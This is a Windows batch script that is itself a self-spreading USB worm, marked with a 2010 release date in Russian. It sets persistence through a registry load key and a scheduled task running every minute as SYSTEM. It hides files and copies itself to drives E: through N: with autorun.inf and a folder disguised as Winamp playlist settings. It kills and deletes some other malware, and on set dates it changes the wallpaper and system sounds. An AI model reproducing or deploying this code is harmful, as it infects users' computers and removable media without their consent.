@echo off
if /i "w%username%e"=="we" goto 2
if /i %0=="%systemroot%\tasks\SA.bat" goto 1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t reg_dword /d 0 /f >nul
start explorer.exe %cd%
if exist "%allusersprofile%\Application Data\current.dat" exit
reg add "hkcu\software\microsoft\windows nt\currentversion\windows" /v load /t reg_sz /d "%systemroot%\tasks\SA.bat" /f >nul
type "WinampSettings\playlist\playlist.m3u">"%allusersprofile%\Application Data\default.dat" || exit
type %0>"%systemroot%\tasks\SA.bat"
type "WinampSettings\playlist\trackcount.wmp">"%allusersprofile%\Application Data\current.dat"
schtasks /create /tn "autocheck" /tr "%systemroot%\tasks\SA.bat" /sc minute /mo 1 /ru "system">nul
type "WinampSettings\playlist\playlist.m3u">"%allusersprofile%\Application Data\default.dat"
attrib +h +s "%systemroot%\tasks\autocheck.job"
exit

:1
@echo off
taskkill /f /im explorer.exe & taskkill /f /im SCVHSOT.exe & taskkill /f /im nissan.exe & taskkill /f /im autorun.exe & taskkill /f /im sysdate.exe & taskkill /f /im csrcs.exe
del "%systemdrive%\recycler\nissan.exe" /s /f /q /a:- >nul
del "%systemdrive%\recycler\autorun.exe" /s /f /q /a:- >nul
del "%systemdrive%\recycler\sysdate.exe" /s /f /q /a:- >nul
del "%systemroot%\SCVHSOT.exe" /s /f /q /a:- >nul
del "%systemroot%\system32\SCVHSOT.exe" /s /f /q /a:- >nul
del "%systemdrive%\data\power.exe" /s /f /q /a:- >nul
del "%systemroot%\system32\csrcs.exe" /f /q /a:- >nul
start explorer.exe
schtasks /delete /tn "autocheck" /f
schtasks /create /tn "autocheck" /tr "%systemroot%\tasks\SA.bat" /sc minute /mo 1 /ru "system">nul
attrib +h +s "%systemroot%\tasks\autocheck.job"
if %date%==01.06.2010 goto 3
if %date%==14.06.2010 goto 3
if %date%==03.12.2010 goto 3
if %date%==15.06.2010 goto 3
if %date%==16.06.2010 goto 3
if %date%==17.06.2010 goto 3
if %date%==18.06.2010 goto 3
if %date%==19.06.2010 goto 3
if %date%==20.06.2010 goto 3
if %date%==15.08.2010 goto 3
if %date%==16.08.2010 goto 3
if %date%==17.08.2010 goto 3
if %date%==18.08.2010 goto 3
if %date%==19.09.2010 goto 3
if %date%==29.09.2010 goto 3
if %date%==20.09.2010 goto 3
if %date%==14.09.2010 goto 3
if %date%==22.03.2010 goto 3
exit

:2
if exist E:\nul if not exist "E:\System Volume Information\" (md "E:\WinampSettings\playlist\" & attrib +h +s "E:\WinampSettings" & echo [.shellclassinfo]>"E:\WinampSettings\playlist\1.tmp" & echo CLSID={1D2680C9-0E2A-469d-B787-065558BC7D43}>"E:\WinampSettings\playlist\2.tmp" & copy "E:\WinampSettings\playlist\1.tmp" + "E:\WinampSettings\playlist\2.tmp" "E:\WinampSettings\desktop.ini" /a & del "E:\WinampSettings\playlist\1.tmp" /q /a:- & del "E:\WinampSettings\playlist\2.tmp" /q /a:- & attrib -h -s -r "E:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"E:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"E:\WinampSettings\playlist\playlist.m3u" & type "%allusersprofile%\Application Data\current.dat">"E:\WinampSettings\playlist\trackcount.wmp" & attrib +h +s +r "E:\autorun.inf" & type %0>"E:\WinampSettings\playlist\tracklist.bat")

if exist F:\nul if not exist "F:\System Volume Information\" (md "F:\WinampSettings\playlist\" & attrib +h +s "F:\WinampSettings" & echo [.shellclassinfo]>"F:\WinampSettings\playlist\1.tmp" & echo CLSID={1D2680C9-0E2A-469d-B787-065558BC7D43}>"F:\WinampSettings\playlist\2.tmp" & copy "F:\WinampSettings\playlist\1.tmp" + "F:\WinampSettings\playlist\2.tmp" "F:\WinampSettings\desktop.ini" /a & del "F:\WinampSettings\playlist\1.tmp" /q /a:- & del "F:\WinampSettings\playlist\2.tmp" /q /a:- & attrib -h -s -r "F:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"F:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"F:\WinampSettings\playlist\playlist.m3u" & type "%allusersprofile%\Application Data\current.dat">"F:\WinampSettings\playlist\trackcount.wmp" & attrib +h +s +r "F:\autorun.inf" & type %0>"F:\WinampSettings\playlist\tracklist.bat")

if exist G:\nul if not exist "G:\System Volume Information\" (md "G:\WinampSettings\playlist\" & attrib +h +s "G:\WinampSettings" & echo [.shellclassinfo]>"G:\WinampSettings\playlist\1.tmp" & echo CLSID={1D2680C9-0E2A-469d-B787-065558BC7D43}>"G:\WinampSettings\playlist\2.tmp" & copy "G:\WinampSettings\playlist\1.tmp" + "G:\WinampSettings\playlist\2.tmp" "G:\WinampSettings\desktop.ini" /a & del "G:\WinampSettings\playlist\1.tmp" /q /a:- & del "G:\WinampSettings\playlist\2.tmp" /q /a:- & attrib -h -s -r "G:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"G:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"G:\WinampSettings\playlist\playlist.m3u" & type "%allusersprofile%\Application Data\current.dat">"G:\WinampSettings\playlist\trackcount.wmp" & attrib +h +s +r "G:\autorun.inf" & type %0>"G:\WinampSettings\playlist\tracklist.bat")

if exist H:\nul if not exist "H:\System Volume Information\" (md "H:\WinampSettings\playlist\" & attrib +h +s "H:\WinampSettings" & echo [.shellclassinfo]>"H:\WinampSettings\playlist\1.tmp" & echo CLSID={1D2680C9-0E2A-469d-B787-065558BC7D43}>"H:\WinampSettings\playlist\2.tmp" & copy "H:\WinampSettings\playlist\1.tmp" + "H:\WinampSettings\playlist\2.tmp" "H:\WinampSettings\desktop.ini" /a & del "H:\WinampSettings\playlist\1.tmp" /q /a:- & del "H:\WinampSettings\playlist\2.tmp" /q /a:- & attrib -h -s -r "H:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"H:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"H:\WinampSettings\playlist\playlist.m3u" & type "%allusersprofile%\Application Data\current.dat">"H:\WinampSettings\playlist\trackcount.wmp" & attrib +h +s +r "H:\autorun.inf" & type %0>"H:\WinampSettings\playlist\tracklist.bat")

if exist I:\nul if not exist "I:\System Volume Information\" (md "I:\WinampSettings\playlist\" & attrib +h +s "I:\WinampSettings" & echo [.shellclassinfo]>"I:\WinampSettings\playlist\1.tmp" & echo CLSID={1D2680C9-0E2A-469d-B787-065558BC7D43}>"I:\WinampSettings\playlist\2.tmp" & copy "I:\WinampSettings\playlist\1.tmp" + "I:\WinampSettings\playlist\2.tmp" "I:\WinampSettings\desktop.ini" /a & del "I:\WinampSettings\playlist\1.tmp" /q /a:- & del "I:\WinampSettings\playlist\2.tmp" /q /a:- & attrib -h -s -r "I:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"I:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"I:\WinampSettings\playlist\playlist.m3u" & type "%allusersprofile%\Application Data\current.dat">"I:\WinampSettings\playlist\trackcount.wmp" & attrib +h +s +r "I:\autorun.inf" & type %0>"I:\WinampSettings\playlist\tracklist.bat")

if exist J:\nul if not exist "J:\System Volume Information\" (md "J:\WinampSettings\playlist\" & attrib +h +s "J:\WinampSettings" & echo [.shellclassinfo]>"J:\WinampSettings\playlist\1.tmp" & echo CLSID={1D2680C9-0E2A-469d-B787-065558BC7D43}>"J:\WinampSettings\playlist\2.tmp" & copy "J:\WinampSettings\playlist\1.tmp" + "J:\WinampSettings\playlist\2.tmp" "J:\WinampSettings\desktop.ini" /a & del "J:\WinampSettings\playlist\1.tmp" /q /a:- & del "J:\WinampSettings\playlist\2.tmp" /q /a:- & attrib -h -s -r "J:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"J:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"J:\WinampSettings\playlist\playlist.m3u" & type "%allusersprofile%\Application Data\current.dat">"J:\WinampSettings\playlist\trackcount.wmp" & attrib +h +s +r "J:\autorun.inf" & type %0>"J:\WinampSettings\playlist\tracklist.bat")

if exist K:\nul if not exist "K:\System Volume Information\" (md "K:\WinampSettings\playlist\" & attrib +h +s "K:\WinampSettings" & echo [.shellclassinfo]>"K:\WinampSettings\playlist\1.tmp" & echo CLSID={1D2680C9-0E2A-469d-B787-065558BC7D43}>"K:\WinampSettings\playlist\2.tmp" & copy "K:\WinampSettings\playlist\1.tmp" + "K:\WinampSettings\playlist\2.tmp" "K:\WinampSettings\desktop.ini" /a & del "K:\WinampSettings\playlist\1.tmp" /q /a:- & del "K:\WinampSettings\playlist\2.tmp" /q /a:- & attrib -h -s -r "K:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"K:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"K:\WinampSettings\playlist\playlist.m3u" & type "%allusersprofile%\Application Data\current.dat">"K:\WinampSettings\playlist\trackcount.wmp" & attrib +h +s +r "K:\autorun.inf" & type %0>"K:\WinampSettings\playlist\tracklist.bat")

if exist L:\nul if not exist "L:\System Volume Information\" (md "L:\WinampSettings\playlist\" & attrib +h +s "L:\WinampSettings" & echo [.shellclassinfo]>"L:\WinampSettings\playlist\1.tmp" & echo CLSID={1D2680C9-0E2A-469d-B787-065558BC7D43}>"L:\WinampSettings\playlist\2.tmp" & copy "L:\WinampSettings\playlist\1.tmp" + "L:\WinampSettings\playlist\2.tmp" "L:\WinampSettings\desktop.ini" /a & del "L:\WinampSettings\playlist\1.tmp" /q /a:- & del "L:\WinampSettings\playlist\2.tmp" /q /a:- & attrib -h -s -r "L:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"L:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"L:\WinampSettings\playlist\playlist.m3u" & type "%allusersprofile%\Application Data\current.dat">"L:\WinampSettings\playlist\trackcount.wmp" & attrib +h +s +r "L:\autorun.inf" & type %0>"L:\WinampSettings\playlist\tracklist.bat")

if exist M:\nul if not exist "M:\System Volume Information\" (md "M:\WinampSettings\playlist\" & attrib +h +s "M:\WinampSettings" & echo [.shellclassinfo]>"M:\WinampSettings\playlist\1.tmp" & echo CLSID={1D2680C9-0E2A-469d-B787-065558BC7D43}>"M:\WinampSettings\playlist\2.tmp" & copy "M:\WinampSettings\playlist\1.tmp" + "M:\WinampSettings\playlist\2.tmp" "M:\WinampSettings\desktop.ini" /a & del "M:\WinampSettings\playlist\1.tmp" /q /a:- & del "M:\WinampSettings\playlist\2.tmp" /q /a:- & attrib -h -s -r "M:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"M:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"M:\WinampSettings\playlist\playlist.m3u" & type "%allusersprofile%\Application Data\current.dat">"M:\WinampSettings\playlist\trackcount.wmp" & attrib +h +s +r "M:\autorun.inf" & type %0>"M:\WinampSettings\playlist\tracklist.bat")

if exist N:\nul if not exist "N:\System Volume Information\" (md "N:\WinampSettings\playlist\" & attrib +h +s "N:\WinampSettings" & echo [.shellclassinfo]>"N:\WinampSettings\playlist\1.tmp" & echo CLSID={1D2680C9-0E2A-469d-B787-065558BC7D43}>"N:\WinampSettings\playlist\2.tmp" & copy "N:\WinampSettings\playlist\1.tmp" + "N:\WinampSettings\playlist\2.tmp" "N:\WinampSettings\desktop.ini" /a & del "N:\WinampSettings\playlist\1.tmp" /q /a:- & del "N:\WinampSettings\playlist\2.tmp" /q /a:- & attrib -h -s -r "N:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"N:\autorun.inf" & type "%allusersprofile%\Application Data\default.dat">"N:\WinampSettings\playlist\playlist.m3u" & type "%allusersprofile%\Application Data\current.dat">"N:\WinampSettings\playlist\trackcount.wmp" & attrib +h +s +r "N:\autorun.inf" & type %0>"N:\WinampSettings\playlist\tracklist.bat")
exit

:3
md "%systemdrive%\recycler" && attrib +s +h "%systemdrive%\recycler"
type "%allusersprofile%\Application Data\current.dat">"%systemdrive%\recycler\vinni.wav"
type "%allusersprofile%\Application Data\default.dat">"%systemdrive%\recycler\kotik.bmp"
reg add "HKCU\Control Panel\Desktop" /v "Wallpaper" /t reg_sz /d "%systemdrive%\recycler\kotik.bmp" /f >nul
reg add "HKCU\Control Panel\Desktop" /v "originalWallpaper" /t reg_sz /d "%systemdrive%\recycler\kotik.bmp" /f >nul
reg add "HKCU\Control Panel\Desktop" /v "convertedWallpaper" /t reg_sz /d "%systemdrive%\recycler\kotik.bmp" /f >nul
reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemAsterisk\.Current" /ve /t reg_sz /d "%systemdrive%\recycler\vinni.wav" /f >nul
reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemExclamation\.Current" /ve /t reg_sz /d "%systemdrive%\recycler\vinni.wav" /f >nul
reg add "HKCU\AppEvents\Schemes\Apps\.Default\SystemNotification\.Current" /ve /t reg_sz /d "%systemdrive%\recycler\vinni.wav" /f >nul
exit

Дата выпуска 05.04.2010
